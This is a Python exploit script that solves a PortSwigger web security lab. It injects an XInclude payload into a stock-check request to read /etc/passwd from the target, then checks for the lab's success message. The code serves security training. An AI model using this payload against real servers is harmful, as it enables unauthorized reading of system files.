#!/usr/bin/env python3
# Lab: Exploiting XInclude to retrieve files
# Lab-Link: https://portswigger.net/web-security/xxe/lab-xinclude-attack

import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def main():
    try:
        host = sys.argv[1].strip().rstrip('/')
    except IndexError:
        print(f'Usage: {sys.argv[0]} <HOST>')
        print(f'Exampe: {sys.argv[0]} http://www.example.com')
        sys.exit(-1)

    client = requests.Session()
    client.verify = False
    client.proxies = proxies

    print(f'[ ] Attempt to exfiltrate contents of /etc/passwd')
    url = f'{host}/product/stock'
    data = 'productId=1<xxx xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></xxx>&storeId=1'
    if 'root:x:0:0:root:/root:/bin/bash' not in client.post(url, data=data).text:
        print(f'[-] Response does not appear to contain contents of /etc/passwd')
        sys.exit(-2)
    print(f'[+] Response appears to contain contents of /etc/passwd')

    if 'Congratulations, you solved the lab!' not in client.get(host).text:
        print(f'[-] Failed to solve lab')
        sys.exit(-3)

    print(f'[+] Lab solved')


if __name__ == "__main__":
    main()